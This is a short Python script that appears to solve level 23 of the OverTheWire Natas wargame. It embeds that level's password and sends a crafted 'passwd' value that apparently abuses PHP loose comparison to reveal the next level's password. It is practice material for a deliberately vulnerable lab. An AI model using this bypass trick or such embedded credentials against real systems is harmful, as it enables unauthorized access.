#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas23"
password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"

url = 'http://%s.natas.labs.overthewire.org/' % username

s = requests.session()

data = {"passwd": "11iloveyou"}

response = s.get(url, params=data, auth=(username, password))
print(re.findall('Password: (.*)</pre', response.text)[0])
